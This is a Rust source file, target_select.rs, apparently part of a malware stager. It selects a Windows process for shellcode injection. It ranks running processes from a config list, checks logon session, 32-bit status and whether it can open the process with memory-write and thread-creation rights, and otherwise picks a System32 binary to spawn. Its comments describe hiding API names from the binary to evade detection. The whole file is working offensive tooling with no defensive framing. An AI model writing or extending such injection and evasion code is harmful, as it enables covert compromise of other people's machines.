// target_select.rs
// Runtime inject target selection.
//
// Walks the candidate list from config in priority order and returns the best
// target for shellcode injection:
//
//   Path A — Existing process:
//     Enumerates running processes, finds a candidate that:
//       • Matches a name in the candidate list (highest-priority match wins)
//       • Is in the same logon session as the stager
//       • Is not a WOW64 (32-bit) process
//       • Can be opened with the required access rights
//     Returns TargetResult::Existing(pid).
//
//   Path B — Spawn fallback:
//     If no suitable existing process is found, walks candidates to find the
//     first whose binary exists under %SystemRoot%\System32\.
//     Returns TargetResult::ToSpawn(full_path).
//
// injection.rs consumes the result and handles the actual memory operations.

use std::ffi::c_void;

use crate::dynload;
use crate::config;

// Local PROCESSENTRY32 definition — inlined so we don't pull
// Win32_System_Diagnostics_ToolHelp from the `windows` crate, which otherwise
// embeds plaintext API names (CreateToolhelp32Snapshot, Process32First/Next)
// in the binary regardless of dynamic resolution.
#[repr(C)]
#[derive(Clone, Copy)]
#[allow(non_snake_case)]
pub struct PROCESSENTRY32 {
    pub dwSize:              u32,
    pub cntUsage:            u32,
    pub th32ProcessID:       u32,
    pub th32DefaultHeapID:   usize,
    pub th32ModuleID:        u32,
    pub cntThreads:          u32,
    pub th32ParentProcessID: u32,
    pub pcPriClassBase:      i32,
    pub dwFlags:             u32,
    pub szExeFile:           [u8; 260],
}

impl Default for PROCESSENTRY32 {
    fn default() -> Self {
        // Safe: PROCESSENTRY32 is a C POD, all-zeros is a valid bit pattern.
        unsafe { core::mem::zeroed() }
    }
}

const TH32CS_SNAPPROCESS:   u32          = 0x00000002;
const INVALID_HANDLE:       *mut c_void  = usize::MAX as *mut c_void;
// Rights needed to inject: VM_OPERATION | VM_WRITE | CREATE_THREAD
const INJECT_ACCESS:        u32          = 0x0002 | 0x0008 | 0x0020;

pub enum TargetResult {
    Existing(u32),    // PID of an injectable running process
    ToSpawn(String),  // Full path of a process to spawn
}

pub fn find_inject_target() -> Option<TargetResult> {
    // Try to inject into a suitable existing process first.
    if let Some(pid) = find_existing() {
        return Some(TargetResult::Existing(pid));
    }
    // Fall back to spawning a new instance.
    spawn_path().map(TargetResult::ToSpawn)
}

// ── Path A: find a running process we can inject into ────────────────────────

fn find_existing() -> Option<u32> {
    unsafe {
        let fn_snapshot = dynload::toolhelp32_snapshot()?;
        let fn_first    = dynload::process32_first()?;
        let fn_next     = dynload::process32_next()?;
        let fn_close    = dynload::close_handle()?;
        let fn_open     = dynload::open_process()?;
        let fn_session  = dynload::pid_to_session_id()?;
        let fn_wow64    = dynload::is_wow64_process()?;
        let fn_self_pid = dynload::get_current_process_id()?;

        // Determine our own session so we only target same-session processes.
        let my_pid = fn_self_pid();
        let mut my_session: u32 = 0;
        fn_session(my_pid, &mut my_session);

        // Build a ranked map: candidate_name_lowercase → priority_index.
        // Lower index = higher priority.
        let candidates: Vec<String> = unsafe { config::STAGER_CONFIG.candidate_names() }
            .map(|s| s.to_lowercase())
            .collect();

        if candidates.is_empty() {
            return None;
        }

        let snapshot = fn_snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot.is_null() || snapshot == INVALID_HANDLE {
            return None;
        }

        let mut entry = PROCESSENTRY32 {
            dwSize: std::mem::size_of::<PROCESSENTRY32>() as u32,
            ..Default::default()
        };

        // best_pid[i] holds the first injectable PID found for candidate[i].
        let mut best: Vec<Option<u32>> = vec![None; candidates.len()];

        if fn_first(snapshot, &mut entry) != 0 {
            loop {
                let proc_name = std::ffi::CStr::from_ptr(entry.szExeFile.as_ptr() as *const i8)
                    .to_string_lossy()
                    .to_lowercase();
                let pid = entry.th32ProcessID;

                // Match against candidate list to find priority index.
                if let Some(idx) = candidates.iter().position(|c| *c == proc_name) {
                    if best[idx].is_none() {
                        // Check session.
                        let mut proc_session: u32 = 0;
                        if fn_session(pid, &mut proc_session) != 0 && proc_session == my_session {
                            // Open with just enough rights to check WOW64, then re-open
                            // with inject rights if it passes.
                            let h_query = fn_open(0x1000 /* PROCESS_QUERY_LIMITED_INFORMATION */, 0, pid);
                            if !h_query.is_null() {
                                let mut is_wow: i32 = 0;
                                fn_wow64(h_query, &mut is_wow);
                                let _ = fn_close(h_query);

                                if is_wow == 0 {
                                    // Confirm we can open with inject rights.
                                    let h_inject = fn_open(INJECT_ACCESS, 0, pid);
                                    if !h_inject.is_null() {
                                        let _ = fn_close(h_inject);
                                        best[idx] = Some(pid);
                                    }
                                }
                            }
                        }
                    }
                }

                if fn_next(snapshot, &mut entry) == 0 {
                    break;
                }
            }
        }

        let _ = fn_close(snapshot);

        // Return the highest-priority (lowest index) match found.
        best.into_iter().find_map(|x| x)
    }
}

// ── Path B: resolve full path for first candidate whose binary exists ─────────

fn spawn_path() -> Option<String> {
    let sys_root = std::env::var("SystemRoot").unwrap_or_else(|_| "C:\\Windows".to_string());
    let sys32    = format!("{}\\System32\\", sys_root);

    for name in unsafe { config::STAGER_CONFIG.candidate_names() } {
        let full = format!("{}{}", sys32, name);
        if std::path::Path::new(&full).exists() {
            return Some(full);
        }
    }
    None
}
